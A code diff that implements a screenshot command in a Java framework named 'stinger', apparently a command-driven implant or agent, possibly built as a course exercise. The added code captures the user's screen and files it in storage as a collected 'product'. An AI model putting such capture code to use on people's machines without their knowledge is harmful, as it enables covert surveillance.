@@ -2,8 +2,16 @@ package stinger.commands.impl;
 
 import stinger.StingerEnvironment;
 import stinger.commands.Command;
+import stinger.os.screenshot.Screenshot;
+import stinger.os.screenshot.ScreenshotTaker;
+import stinger.storage.StandardProductType;
+import stinger.storage.Storage;
+import stinger.storage.impl.BinaryProduct;
 import stingerlib.commands.CommandException;
 import stingerlib.commands.Parameters;
+import stingerlib.storage.StorageException;
+
+import java.io.IOException;
 
 public class TakeScreenshotCommand implements Command {
 
@@ -24,5 +32,15 @@ public class TakeScreenshotCommand implements Command {
         //   ScreenshotTaker screenshotTaker = new ScreenshotTaker();
         //   Screenshot screenshot = screenshotTaker.takeScreenshot();
         //      can do screenshot.getBytes() or screenshot.saveToFile(file)
+
+        try {
+            ScreenshotTaker taker = new ScreenshotTaker();
+            Screenshot screenshot = taker.takeScreenshot();
+
+            Storage storage = environment.getStorage();
+            storage.store(new BinaryProduct(screenshot.getBytes(), StandardProductType.SCREENSHOT));
+        } catch (StorageException | IOException e) {
+            throw new CommandException(e);
+        }
     }
 }
